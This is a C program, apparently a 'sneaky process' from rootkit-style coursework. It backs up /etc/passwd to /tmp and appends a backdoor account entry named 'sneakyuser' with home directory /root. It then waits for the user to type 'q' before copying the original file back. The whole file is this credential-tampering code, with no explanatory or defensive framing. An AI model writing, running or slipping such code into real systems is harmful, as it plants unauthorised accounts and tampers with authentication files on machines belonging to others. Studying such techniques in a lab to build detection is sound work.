#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

#define PASSWD_PATH "/etc/passwd"
#define BACKUP_PATH "/tmp/passwd"
#define SNEAKY_ENTRY "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n"

static void die(const char *message)
{
  perror(message);
  exit(EXIT_FAILURE);
}

static void copy_file(const char *source_path, const char *dest_path)
{
  char buffer[4096];
  ssize_t bytes_read;
  int source_fd = open(source_path, O_RDONLY);
  int dest_fd;

  if (source_fd < 0) {
    die("open source");
  }

  dest_fd = open(dest_path, O_WRONLY | O_CREAT | O_TRUNC, 0600);
  if (dest_fd < 0) {
    close(source_fd);
    die("open destination");
  }

  while ((bytes_read = read(source_fd, buffer, sizeof(buffer))) > 0) {
    ssize_t total_written = 0;

    while (total_written < bytes_read) {
      ssize_t bytes_written =
          write(dest_fd, buffer + total_written, bytes_read - total_written);

      if (bytes_written < 0) {
        close(source_fd);
        close(dest_fd);
        die("write");
      }

      total_written += bytes_written;
    }
  }

  if (bytes_read < 0) {
    close(source_fd);
    close(dest_fd);
    die("read");
  }

  if (close(source_fd) < 0) {
    close(dest_fd);
    die("close source");
  }

  if (close(dest_fd) < 0) {
    die("close destination");
  }
}

static void append_sneaky_entry(void)
{
  const char *entry = SNEAKY_ENTRY;
  int passwd_fd = open(PASSWD_PATH, O_WRONLY | O_APPEND);
  size_t entry_length = strlen(entry);
  ssize_t total_written = 0;

  if (passwd_fd < 0) {
    die("open passwd");
  }

  while ((size_t)total_written < entry_length) {
    ssize_t bytes_written = write(passwd_fd, entry + total_written,
                                  entry_length - (size_t)total_written);

    if (bytes_written < 0) {
      close(passwd_fd);
      die("append passwd");
    }

    total_written += bytes_written;
  }

  if (close(passwd_fd) < 0) {
    die("close passwd");
  }
}

int main(void)
{
  int ch;

  printf("sneaky_process pid = %d\n", getpid());
  copy_file(PASSWD_PATH, BACKUP_PATH);
  append_sneaky_entry();

  while ((ch = getchar()) != EOF) {
    if (ch == 'q') {
      break;
    }
  }

  copy_file(BACKUP_PATH, PASSWD_PATH);
  return 0;
}
